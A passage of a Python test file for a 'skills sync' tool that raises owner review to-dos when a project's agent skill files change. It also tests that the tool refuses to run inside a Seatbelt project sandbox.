        self.assertEqual(self.kinds()[-1][0], "task")
        self.assertNotEqual(self.kinds()[-1][1], key, "a new review, a new to-do")
        self.skill("foo", {"SKILL.md": "y\n"})   # back to what was approved
        self.remind()
        self.assertEqual(self.kinds()[-1][0], "task", "not withdrawn at once (S5)")
        self.assertEqual(skills_sync.pending_rows(), [])
        with mock.patch.object(skills_sync, "DROP_AFTER", datetime.timedelta(0)):
            self.remind()
        self.assertEqual(self.kinds()[-1][0], "drop")

    def test_a_revert_and_redo_keeps_the_same_to_do(self):
        """S5: skills/ back at the approved set for less than DROP_AFTER, then changed again: no drop, the same key."""
        self.skill("foo", {"SKILL.md": "a\n"})
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "b\n"})
        self.remind()
        key = self.kinds()[-1][1]
        self.skill("foo", {"SKILL.md": "a\n"})
        self.remind()
        self.skill("foo", {"SKILL.md": "c\n"})
        self.remind()
        self.assertEqual([k for k, _ in self.kinds()], ["task", "task"])
        self.assertEqual({k for _, k in self.kinds()}, {key})

    def test_a_held_lock_keeps_the_last_row_and_doesnt_wait(self):
        """S4: a review left open at its question holds the project's lock; the job goes on without it."""
        self.skill("foo", {"SKILL.md": "a\n"})
        self.remind()
        row = dict(skills_sync.pending_rows())["proj"]
        self.skill("foo", {"SKILL.md": "b\n"})
        (self.tmp / "state").mkdir(exist_ok=True)
        with open(self.tmp / "state" / "proj.lock", "w") as held:
            import fcntl
            fcntl.flock(held, fcntl.LOCK_EX)
            t0 = time.monotonic()
            self.assertEqual(self.remind(), 0)
            self.assertLess(time.monotonic() - t0, 5)
        self.assertEqual(dict(skills_sync.pending_rows())["proj"], row)
        self.assertEqual(len(self.sent), 1, "nothing sent for a project it couldn't look at")

    def test_a_change_set_seen_before_gets_a_new_to_do(self):
        """A → B → A: the second review of A is a new to-do, never the closed one's key again."""
        self.skill("foo", {"SKILL.md": "a\n"})
        self.remind()
        first = self.kinds()[-1][1]
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "b\n"})
        self.remind()
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "a\n"})
        self.remind()
        keys = [k for kind, k in self.kinds() if kind == "task"]
        self.assertEqual(len(keys), 3)
        self.assertEqual(len(set(keys)), 3, keys)
        self.assertEqual(keys[0], first)

    def test_a_sync_takes_the_status_row_away(self):
        self.skill("foo", {"SKILL.md": "a\n"})
        self.remind()
        self.assertTrue(skills_sync.pending_rows())
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual(skills_sync.pending_rows(), [])

    def test_a_problem_in_skills_waits_for_review_too(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        os.symlink(self.outside, self.ws / "skills/foo/l")
        self.remind()
        self.assertEqual(dict(skills_sync.pending_rows())["proj"]["problems"], 1)

    def test_not_sandboxed_and_never_synced_isnt_watched(self):
        self.docs["proj"]["enforce"] = {}
        self.skill("foo", {"SKILL.md": "x\n"})
        self.remind()
        self.assertEqual(self.sent, [])


@unittest.skipUnless(HAS_SEATBELT, "needs Seatbelt")
class RealSandbox(Base):
    def test_a_process_whose_platform_state_is_unreadable_is_refused(self):
        """isolation.confined_now as it is, inside a Seatbelt profile that keeps the platform's state and secrets
        unreadable (as every project sandbox does)."""
        state = self.tmp / "state-live"
        state.mkdir()
        env = {**os.environ, "BRUNNA_STATE": str(state)}
        secrets = subprocess.run([sys.executable, "-c", "import sys; sys.path.insert(0, sys.argv[1]); import hubconf; "
                                  "print(hubconf.secrets_dir())", str(BIN)], env=env, capture_output=True,
                                 text=True).stdout.strip()
        prof = (f'(version 1)(allow default)(deny file-read* (subpath "{state}"))'
                f'(deny file-read* (subpath "{secrets}"))')
        # the sandbox check alone: the test itself may run inside a coding agent's session
        code = ("import sys; sys.path.insert(0, sys.argv[1]); import skills_sync, runtime_ports; "
                "runtime_ports.current_session = lambda env=None: None; "
                "print(skills_sync.refuse_here() or 'allowed')")
        r = subprocess.run([seatbelt.SANDBOX_EXEC, "-p", prof, sys.executable, "-c", code, str(BIN)], env=env,
                           capture_output=True, text=True)
        self.assertIn(T("brunna skills sync runs only in your own terminal, never inside a project's sandbox"),
                      r.stdout, r.stderr)
        r = subprocess.run([sys.executable, "-c", code, str(BIN)], env=env, capture_output=True, text=True)
        self.assertIn("allowed", r.stdout, r.stderr)


class Cli(unittest.TestCase):
    def test_not_a_session_command(self):
        ah = load("agenthub_skills_t", BIN / "agenthub")
        self.assertIn("skills", ah.COMMANDS)
        self.assertNotIn("skills", ah.SESSION_COMMANDS)
        import policy
        self.assertFalse([c for c in policy.platform_cli() if c.split()[1:2] == ["skills"]])

    def test_usage(self):
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(skills_sync.main(["sync"]), 2)
            self.assertEqual(skills_sync.main(["nope"]), 2)


class ThroughTheBus(Base):
    """The reminder's letters through real hubbus on a scratch bus (records on, as the owner side reads them): raised,
    amended, claimed, withdrawn, and a later period raised anew."""

    def setUp(self):
        super().setUp()
        loader = importlib.machinery.SourceFileLoader("hubbus_skills_t", str(BIN / "hubbus"))
        spec = importlib.util.spec_from_loader("hubbus_skills_t", loader)
        m = self.m = importlib.util.module_from_spec(spec)
        loader.exec_module(m)
        m.DB = self.tmp / "bus.db"
        m.log = lambda s: None
        hub = hubconf.hub_project()
        m.projects = lambda: {hub: self.tmp, "proj": self.ws}
        self.c = m.db()
        m.db = lambda *a, **k: self.c
        m.RECORDS = True

        def notify(*args):
            argv = ["hubbus", "send", "--from", hub, "--to", hubconf.owner_address(), *args]
            with mock.patch.object(sys, "argv", argv), contextlib.redirect_stdout(io.StringIO()):
                m.main()
        p = mock.patch.object(skills_sync, "owner_notify", notify)
        p.start()
        self.addCleanup(p.stop)

    def records(self):
        return [self.m.payload(r)["record"] for r in self.c.execute("SELECT * FROM events WHERE type='record' "
                                                                     "ORDER BY seq")]

    def test_the_owner_side_sees_each_step(self):
        def remind():
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                self.assertEqual(skills_sync.remind(), 0, err.getvalue())
        self.skill("foo", {"SKILL.md": "a\n"})
        remind()
        self.skill("foo", {"SKILL.md": "b\n"})
        remind()
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "c\n"})
        remind()
        self.skill("foo", {"SKILL.md": "b\n"})
        remind()
        with mock.patch.object(skills_sync, "DROP_AFTER", datetime.timedelta(0)):
            remind()
        self.skill("foo", {"SKILL.md": "a\n"})
        remind()
        got = [(r["type"], r["key"]) for r in self.records()]
        # the second change set (still one skill) re-sends the same key and terms: nothing new, one to-do
        self.assertEqual([t for t, _k in got], ["raised", "claimed", "raised", "withdrawn", "raised"], got)
        keys = [k for _t, k in got]
        self.assertEqual(keys[0], keys[1])
        self.assertEqual(keys[2], keys[3])
        self.assertEqual(len({keys[0], keys[2], keys[4]}), 3)
        self.skill("bar", {"SKILL.md": "x\n"})   # two skills now: the open to-do is amended
        remind()
        self.assertEqual((self.records()[-1]["type"], self.records()[-1]["key"]), ("amended", keys[4]))
        for r in self.records():
            self.assertEqual(self.m.record_errors(r), [])


if __name__ == "__main__":
    unittest.main()
